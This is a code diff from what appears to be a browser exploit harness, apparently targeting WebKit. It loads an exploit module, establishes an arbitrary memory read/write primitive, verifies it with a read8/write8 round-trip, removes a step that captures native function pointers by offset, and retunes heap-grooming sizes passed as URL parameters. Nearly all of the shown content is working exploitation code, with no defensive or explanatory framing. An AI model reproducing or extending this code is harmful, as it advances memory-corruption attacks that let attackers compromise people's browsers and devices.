@@ -556,10 +556,10 @@ async function runEstablish() {
         return;
     }
 
-    if (lines.length > 40) {
-        lines.splice(0, lines.length - 40);
-        renderLog();
-    }
+    lines.length = 0;
+    passCount = 0;
+    failCount = 0;
+    renderLog();
     logQuiet++;
 
     const { establishPrimitive, installWindowP, pairStatus } = await loadExploit();
@@ -611,15 +611,9 @@ async function runEstablish() {
     p.write8(addrA, headerA);
     check("read8-write8-roundtrip-header", same64(p.read8(addrA), headerA), "");
 
-    const { off: capOff } = offsetsForKey(resolvedOffKey());
-    if (capOff)
-        captureNativeFn(p, capOff.wk_JSFunction_m_function || 0x28);
-
     saveSession();
-    state("primitive OK — run step 3 calibrate, then step 2 verify", "ok");
-    mark("READY", "cal is step 3 (kept out of step 1 to avoid OOM)");
-    if (capOff)
-        mark("HINT", "step 3 = calibrate in tiny chunks — tap repeatedly until CAL-OK");
+    state("primitive OK — step 3 calibrate, then step 2 verify", "ok");
+    mark("READY", "PRIMITIVE-OK — cal is separate (step 3)");
 }
 
 async function runOffsetTests() {
@@ -825,14 +819,9 @@ function init() {
         url.searchParams.set("clear", "1");
         url.searchParams.delete("slots");
         url.searchParams.delete("g");
-        url.searchParams.append("g", "drain:96");
+        url.searchParams.append("g", "drain:128");
         url.searchParams.append("g", "drainsz:16384");
-        url.searchParams.append("g", "slab:524288");
-        url.searchParams.append("g", "bfly:32768");
-        url.searchParams.append("g", "early:24576");
-        url.searchParams.append("g", "guard:32768");
-        url.searchParams.append("g", "pred:32768");
-        url.searchParams.append("g", "final:32768");
+        url.searchParams.append("g", "slab:1048576");
         location.href = url.toString();
     });
 
